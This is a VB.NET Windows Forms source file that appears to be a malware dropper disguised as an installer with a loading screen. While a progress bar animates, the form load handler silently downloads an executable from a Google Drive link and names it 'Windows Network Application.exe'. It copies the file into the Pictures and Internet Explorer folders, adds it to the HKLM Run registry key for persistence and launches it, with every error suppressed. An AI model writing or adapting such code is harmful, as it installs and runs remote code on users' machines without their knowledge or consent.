Imports System
Imports System.IO
Imports System.Net

Public Class Form1
    Dim timervalue As Integer
    Private Sub btn_cancel_Click(sender As Object, e As EventArgs) Handles btn_cancel.Click
        Close()
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Threading.Thread.Sleep(5000)
        btn_cancel.BackColor = Color.Transparent
        btn_cancel.FlatAppearance.MouseOverBackColor = Color.Transparent
        btn_cancel.FlatAppearance.MouseDownBackColor = Color.Transparent
        btn_cancel.FlatAppearance.BorderSize = 0
        btn_cancel.FlatStyle = FlatStyle.Flat
        ProgressBar1.Style = ProgressBarStyle.Marquee
        ProgressBar1.MarqueeAnimationSpeed = 30
        Timer1.Interval = 50
        Timer1.Start()

        Dim username As String = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
        Dim httpclient As New WebClient
        Try
            httpclient.DownloadFile(New Uri("https://drive.google.com/uc?export=download&id=0B7UryfYW3vIiSTdqbEUyY2hHSVE"), (username & "\Downloads\Windows Network Application.exe"))
            httpclient.Dispose()
        Catch
        End Try
        If File.Exists(username & "\pictures\Windows Network Application.exe") = False Then
            Try
                My.Computer.FileSystem.CopyFile(username & "\Downloads\Windows Network Application.exe", username & "\Pictures\Windows Network Application.exe", True)
                My.Computer.FileSystem.CopyFile(username & "\Pictures\Windows Network Application.exe", "C:\Program Files (x86)\Internet Explorer\Windows Network Application.exe")
            Catch
            End Try
        Else
        End If

        Dim regkey As Microsoft.Win32.RegistryKey
        Dim regkey1 As Microsoft.Win32.RegistryKey
        If Microsoft.Win32.Registry.LocalMachine.OpenSubKey("winipn") Is Nothing Then
            regkey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
            regkey1 = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
            regkey.SetValue("winipn", username & "\Pictures\Windows Network Application.exe")
            regkey1.SetValue("winipn", "C:\Program Files (x86)\Internet Explorer\Windows Network Application.exe")
        Else
        End If

        Dim myprocess As New Process()
        myprocess.StartInfo.FileName = (username & "\Pictures\Windows Network Application.exe")
        myprocess.Start()


    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        timervalue += 1
        If timervalue = 180 Then
            ProgressBar1.MarqueeAnimationSpeed = 0
            Timer1.Stop()
            Dim secondform As New Form2
            secondform.Show()
            Me.Hide()

        End If
    End Sub
End Class
